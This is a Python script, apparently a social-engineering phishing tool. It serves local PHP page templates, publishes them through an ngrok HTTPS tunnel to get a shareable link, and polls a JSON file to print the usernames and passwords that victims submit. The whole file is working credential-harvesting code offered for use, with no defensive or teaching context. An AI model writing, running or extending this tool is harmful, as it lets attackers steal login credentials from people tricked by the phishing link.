from colorama import Fore, Style
from subprocess import Popen
from pyngrok import ngrok
import os
import time
import json
from modules import banner, deb
from vpn import vpn

#vpn.disconnect()

#vpn.connect()


jsonFile = open("./template/username.json", "w")
jsonWrite = jsonFile.write("")
jsonFile.close()

stat_file = 0

def social():
    banner.banner()
    menu = input(">>>")
    deb.menu(menu)
    print(" ")
    def phpserver():
      with open("Server", "w") as phplog:
        Popen(("php", "-S", "localhost:4040", "-t", "./template"),stderr=phplog,stdout=phplog)
    phpserver()

    url = ngrok.connect(4040, "http").replace("http", "https")
    print(Style.BRIGHT+Fore.CYAN+"[-] Link "+Fore.BLUE+url+Style.RESET_ALL)

    def user():
      global stat_file
      if not str(os.stat("./template/username.json").st_size) == stat_file:
        stat_file = str(os.stat("./template/username.json").st_size)
        fileip = open("./template/username.json", "r")
        b = fileip.read()
        try:
          info = json.loads(b)
          for value in info['dev']:
            print(Style.BRIGHT+Fore.GREEN+" [+] "+Fore.WHITE+"Username : "+Fore.YELLOW+value["username"])
            print(Style.BRIGHT+Fore.GREEN+" [+] "+Fore.WHITE+"Password : "+Fore.YELLOW+value["password"])
            jsonFile = open("./template/username.json", "w")
            jsonWrite = jsonFile.write("")
            jsonFile.close()
        except:
          print("\nCtrl + C To stop\n")
          #os.system("killall -9 php")
    while True:                                                           
      user()


social()

